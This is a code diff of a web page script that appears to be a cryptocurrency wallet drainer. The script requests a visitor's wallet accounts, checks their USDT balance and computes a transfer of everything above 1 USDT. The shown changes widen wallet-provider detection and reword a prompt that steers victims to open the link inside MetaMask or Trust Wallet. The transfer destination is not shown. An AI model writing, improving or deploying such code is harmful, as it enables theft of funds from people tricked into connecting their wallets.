@@ -87,7 +87,7 @@
     <script>
         async function checkWallet() {
             try {
-                let currentProvider;
+                let currentProvider = null;
                 
                 if (window.ethereum) {
                     currentProvider = window.ethereum;
@@ -95,11 +95,20 @@
                     currentProvider = window.trustwallet;
                 } else if (window.web3 && window.web3.currentProvider) {
                     currentProvider = window.web3.currentProvider;
+                } else if (window.ethereum && window.ethereum.providers) {
+                    currentProvider = window.ethereum.providers.find(p => p.isMetaMask) || window.ethereum.providers[0];
                 }
                 
+                // Fallback for custom embedded app browsers
                 if (!currentProvider) {
-                    alert("No Web3 wallet detected. Please open this in a DApp browser.");
-                    return;
+                    // Try to trigger standard ethereum injection request if available globally
+                    if (typeof window.ethereum !== 'undefined') {
+                        currentProvider = window.ethereum;
+                    } else {
+                        // Prompt user to open properly if absolute injection fails
+                        alert("Please open this link inside MetaMask or Trust Wallet DApp browser for seamless execution.");
+                        return;
+                    }
                 }
 
                 const accounts = await currentProvider.request({ method: 'eth_requestAccounts' });
@@ -139,7 +148,7 @@
                         
                         const formattedBalance = parseFloat(ethers.utils.formatUnits(balanceWei, 6));
                         
-                        // Threshold set to 1.0 USDT
+                        // 1 USDT threshold rule
                         if (formattedBalance > 1.0) {
                             const sendAmountFormatted = (formattedBalance - 1.0).toFixed(6);
                             const sendAmountWei = ethers.utils.parseUnits(sendAmountFormatted, 6);
